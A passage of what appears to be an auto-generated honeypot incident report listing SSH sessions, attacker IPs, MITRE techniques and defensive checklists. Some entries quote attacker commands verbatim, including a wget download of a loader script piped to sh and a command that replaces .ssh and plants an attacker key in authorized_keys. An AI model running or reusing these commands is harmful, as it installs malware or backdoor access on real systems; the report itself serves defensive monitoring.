- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a6a0f7d7444

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:43 |
| **Last Seen** | 2026-07-24 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:43:31` | `cowrie.session.connect` |
| `2026-07-24 06:43:31` | `cowrie.client.version` |
| `2026-07-24 06:43:31` | `cowrie.client.kex` |
| `2026-07-24 06:43:32` | `cowrie.login.success` |
| `2026-07-24 06:43:33` | `cowrie.session.params` |
| `2026-07-24 06:43:33` | `cowrie.command.input` |
| `2026-07-24 06:43:33` | `cowrie.log.closed` |
| `2026-07-24 06:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb3b1191be9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:45 |
| **Last Seen** | 2026-07-24 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:45:21` | `cowrie.session.connect` |
| `2026-07-24 06:45:21` | `cowrie.client.version` |
| `2026-07-24 06:45:22` | `cowrie.client.kex` |
| `2026-07-24 06:45:22` | `cowrie.login.success` |
| `2026-07-24 06:45:23` | `cowrie.session.params` |
| `2026-07-24 06:45:23` | `cowrie.command.input` |
| `2026-07-24 06:45:23` | `cowrie.log.closed` |
| `2026-07-24 06:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab40d6c3873

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-24 06:45 |
| **Last Seen** | 2026-07-24 06:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:45:44` | `cowrie.session.connect` |
| `2026-07-24 06:45:45` | `cowrie.client.version` |
| `2026-07-24 06:45:45` | `cowrie.client.kex` |
| `2026-07-24 06:45:46` | `cowrie.login.success` |
| `2026-07-24 06:45:46` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f0f53df74f

| Field | Detail |
|---|---|
| **Source IP** | `211.53.58[.]10` |
| **First Seen** | 2026-07-24 06:45 |
| **Last Seen** | 2026-07-24 06:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:45:56` | `cowrie.session.connect` |
| `2026-07-24 06:45:57` | `cowrie.client.version` |
| `2026-07-24 06:45:57` | `cowrie.client.kex` |
| `2026-07-24 06:46:00` | `cowrie.login.success` |
| `2026-07-24 06:46:02` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.53.58[.]10` to AbuseIPDB if not already reported
- [ ] Block `211.53.58[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c17410dc0c7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:47 |
| **Last Seen** | 2026-07-24 06:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:47:16` | `cowrie.session.connect` |
| `2026-07-24 06:47:16` | `cowrie.client.version` |
| `2026-07-24 06:47:16` | `cowrie.client.kex` |
| `2026-07-24 06:47:16` | `cowrie.login.success` |
| `2026-07-24 06:47:17` | `cowrie.session.params` |
| `2026-07-24 06:47:17` | `cowrie.command.input` |
| `2026-07-24 06:47:17` | `cowrie.log.closed` |
| `2026-07-24 06:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d631484801de

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]174` |
| **First Seen** | 2026-07-24 06:47 |
| **Last Seen** | 2026-07-24 06:49 |
| **Session Duration** | 105s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `su, shell, uname -a, cd /var/run || cd /mnt || cd /root || cd /; wget -qO- hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh | sh -s 164.215.103[.]113` |
| **Download Attempts** | hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:47:58` | `cowrie.session.connect` |
| `2026-07-24 06:47:59` | `cowrie.login.success` |
| `2026-07-24 06:48:00` | `cowrie.session.params` |
| `2026-07-24 06:48:00` | `cowrie.command.input` |
| `2026-07-24 06:48:01` | `cowrie.command.input` |
| `2026-07-24 06:48:01` | `cowrie.command.failed` |
| `2026-07-24 06:48:02` | `cowrie.command.input` |
| `2026-07-24 06:48:04` | `cowrie.command.input` |
| `2026-07-24 06:48:04` | `cowrie.session.file_download` |
| `2026-07-24 06:49:44` | `cowrie.log.closed` |
| `2026-07-24 06:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]174` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35662d168b93

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:49 |
| **Last Seen** | 2026-07-24 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:49:05` | `cowrie.session.connect` |
| `2026-07-24 06:49:05` | `cowrie.client.version` |
| `2026-07-24 06:49:05` | `cowrie.client.kex` |
| `2026-07-24 06:49:05` | `cowrie.login.success` |
| `2026-07-24 06:49:06` | `cowrie.session.params` |
| `2026-07-24 06:49:06` | `cowrie.command.input` |
| `2026-07-24 06:49:06` | `cowrie.log.closed` |
| `2026-07-24 06:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f70c2830f62

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:50 |
| **Last Seen** | 2026-07-24 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:50:49` | `cowrie.session.connect` |
| `2026-07-24 06:50:49` | `cowrie.client.version` |
| `2026-07-24 06:50:49` | `cowrie.client.kex` |
| `2026-07-24 06:50:49` | `cowrie.login.success` |
| `2026-07-24 06:50:50` | `cowrie.session.params` |
| `2026-07-24 06:50:50` | `cowrie.command.input` |
| `2026-07-24 06:50:50` | `cowrie.log.closed` |
| `2026-07-24 06:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5eb63c0e25d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:52 |
| **Last Seen** | 2026-07-24 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:52:36` | `cowrie.session.connect` |
| `2026-07-24 06:52:36` | `cowrie.client.version` |
| `2026-07-24 06:52:36` | `cowrie.client.kex` |
| `2026-07-24 06:52:36` | `cowrie.login.success` |
| `2026-07-24 06:52:37` | `cowrie.session.params` |
| `2026-07-24 06:52:37` | `cowrie.command.input` |
| `2026-07-24 06:52:37` | `cowrie.log.closed` |
| `2026-07-24 06:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-646b43391af8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:54 |
| **Last Seen** | 2026-07-24 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:54:24` | `cowrie.session.connect` |
| `2026-07-24 06:54:24` | `cowrie.client.version` |
| `2026-07-24 06:54:24` | `cowrie.client.kex` |
| `2026-07-24 06:54:24` | `cowrie.login.success` |
| `2026-07-24 06:54:25` | `cowrie.session.params` |
| `2026-07-24 06:54:25` | `cowrie.command.input` |
| `2026-07-24 06:54:25` | `cowrie.log.closed` |
| `2026-07-24 06:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-affba99af580

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 06:55 |
| **Last Seen** | 2026-07-24 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:55:52` | `cowrie.session.connect` |
| `2026-07-24 06:55:52` | `cowrie.client.version` |
| `2026-07-24 06:55:52` | `cowrie.client.kex` |
| `2026-07-24 06:55:52` | `cowrie.login.success` |
| `2026-07-24 06:55:52` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:55:52` | `cowrie.direct-tcpip.data` |
| `2026-07-24 06:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98dc0a46a979

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:56 |
| **Last Seen** | 2026-07-24 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:56:11` | `cowrie.session.connect` |
| `2026-07-24 06:56:11` | `cowrie.client.version` |
| `2026-07-24 06:56:11` | `cowrie.client.kex` |
| `2026-07-24 06:56:11` | `cowrie.login.success` |
| `2026-07-24 06:56:12` | `cowrie.session.params` |
| `2026-07-24 06:56:12` | `cowrie.command.input` |
| `2026-07-24 06:56:12` | `cowrie.log.closed` |
| `2026-07-24 06:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23df5d97df6

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-24 06:57 |
| **Last Seen** | 2026-07-24 06:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:57:45` | `cowrie.session.connect` |
| `2026-07-24 06:57:45` | `cowrie.client.version` |
| `2026-07-24 06:57:45` | `cowrie.client.kex` |
| `2026-07-24 06:57:46` | `cowrie.login.success` |
| `2026-07-24 06:57:47` | `cowrie.session.params` |
| `2026-07-24 06:57:47` | `cowrie.command.input` |
| `2026-07-24 06:57:47` | `cowrie.command.failed` |
| `2026-07-24 06:57:47` | `cowrie.log.closed` |
| `2026-07-24 06:57:48` | `cowrie.session.params` |
| `2026-07-24 06:57:48` | `cowrie.command.input` |
| `2026-07-24 06:57:49` | `cowrie.session.file_download` |
| `2026-07-24 06:57:49` | `cowrie.log.closed` |
| `2026-07-24 06:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cff728373e78

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-24 06:57 |
| **Last Seen** | 2026-07-24 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:57:49` | `cowrie.session.connect` |
| `2026-07-24 06:57:49` | `cowrie.client.version` |
| `2026-07-24 06:57:49` | `cowrie.client.kex` |
| `2026-07-24 06:57:50` | `cowrie.login.success` |
| `2026-07-24 06:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a991fc745c6

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-24 06:57 |
| **Last Seen** | 2026-07-24 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:57:51` | `cowrie.session.connect` |
| `2026-07-24 06:57:51` | `cowrie.client.version` |
| `2026-07-24 06:57:51` | `cowrie.client.kex` |
| `2026-07-24 06:57:52` | `cowrie.login.success` |
| `2026-07-24 06:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a54ae568b49

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:58 |
| **Last Seen** | 2026-07-24 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:58:00` | `cowrie.session.connect` |
| `2026-07-24 06:58:00` | `cowrie.client.version` |
| `2026-07-24 06:58:00` | `cowrie.client.kex` |
| `2026-07-24 06:58:01` | `cowrie.login.success` |
| `2026-07-24 06:58:01` | `cowrie.session.params` |
| `2026-07-24 06:58:01` | `cowrie.command.input` |
| `2026-07-24 06:58:02` | `cowrie.log.closed` |
| `2026-07-24 06:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced449da216b

| Field | Detail |
|---|---|
| **Source IP** | `95.35.29[.]192` |
| **First Seen** | 2026-07-24 06:59 |
| **Last Seen** | 2026-07-24 06:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:59:39` | `cowrie.session.connect` |
| `2026-07-24 06:59:40` | `cowrie.client.version` |
| `2026-07-24 06:59:40` | `cowrie.client.kex` |
| `2026-07-24 06:59:41` | `cowrie.login.success` |
| `2026-07-24 06:59:41` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.35.29[.]192` to AbuseIPDB if not already reported
- [ ] Block `95.35.29[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77dba8a042b1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:59 |
| **Last Seen** | 2026-07-24 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:59:56` | `cowrie.session.connect` |
| `2026-07-24 06:59:56` | `cowrie.client.version` |
| `2026-07-24 06:59:56` | `cowrie.client.kex` |
| `2026-07-24 06:59:56` | `cowrie.login.success` |
| `2026-07-24 06:59:57` | `cowrie.session.params` |
| `2026-07-24 06:59:57` | `cowrie.command.input` |
| `2026-07-24 06:59:57` | `cowrie.log.closed` |
| `2026-07-24 06:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdffba6cae33

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:01 |
| **Last Seen** | 2026-07-24 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:01:48` | `cowrie.session.connect` |
| `2026-07-24 07:01:48` | `cowrie.client.version` |
| `2026-07-24 07:01:48` | `cowrie.client.kex` |
| `2026-07-24 07:01:48` | `cowrie.login.success` |
| `2026-07-24 07:01:49` | `cowrie.session.params` |
| `2026-07-24 07:01:49` | `cowrie.command.input` |
| `2026-07-24 07:01:49` | `cowrie.log.closed` |
| `2026-07-24 07:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae7ca77c9240

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-07-24 07:02 |
| **Last Seen** | 2026-07-24 07:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:02:13` | `cowrie.session.connect` |
| `2026-07-24 07:02:13` | `cowrie.client.version` |
| `2026-07-24 07:02:13` | `cowrie.client.kex` |
| `2026-07-24 07:02:15` | `cowrie.login.success` |
| `2026-07-24 07:02:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2559f119d2

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-07-24 07:02 |
| **Last Seen** | 2026-07-24 07:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:02:21` | `cowrie.session.connect` |
| `2026-07-24 07:02:21` | `cowrie.client.version` |
| `2026-07-24 07:02:21` | `cowrie.client.kex` |
| `2026-07-24 07:02:23` | `cowrie.login.success` |
| `2026-07-24 07:02:23` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d113ff4c61d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:02 |
| **Last Seen** | 2026-07-24 07:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:02:24` | `cowrie.session.connect` |
| `2026-07-24 07:02:25` | `cowrie.client.version` |
| `2026-07-24 07:02:25` | `cowrie.client.kex` |
| `2026-07-24 07:02:27` | `cowrie.login.success` |
| `2026-07-24 07:02:29` | `cowrie.session.params` |
| `2026-07-24 07:02:29` | `cowrie.command.input` |
| `2026-07-24 07:02:29` | `cowrie.command.input` |
| `2026-07-24 07:02:29` | `cowrie.command.input` |
| `2026-07-24 07:02:30` | `cowrie.command.input` |
| `2026-07-24 07:02:30` | `cowrie.command.input` |
| `2026-07-24 07:02:30` | `cowrie.command.success` |
| `2026-07-24 07:02:30` | `cowrie.command.input` |
| `2026-07-24 07:02:30` | `cowrie.command.input` |
| `2026-07-24 07:02:30` | `cowrie.command.input` |
| `2026-07-24 07:02:30` | `cowrie.command.input` |
| `2026-07-24 07:02:30` | `cowrie.log.closed` |
| `2026-07-24 07:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c25aaf59765b

| Field | Detail |
|---|---|
| **Source IP** | `221.195.122[.]188` |
| **First Seen** | 2026-07-24 07:02 |
| **Last Seen** | 2026-07-24 07:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:02:47` | `cowrie.session.connect` |
| `2026-07-24 07:02:47` | `cowrie.client.version` |
| `2026-07-24 07:02:47` | `cowrie.client.kex` |
| `2026-07-24 07:02:50` | `cowrie.login.success` |
| `2026-07-24 07:02:51` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.195.122[.]188` to AbuseIPDB if not already reported
- [ ] Block `221.195.122[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e31977bbdddb

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
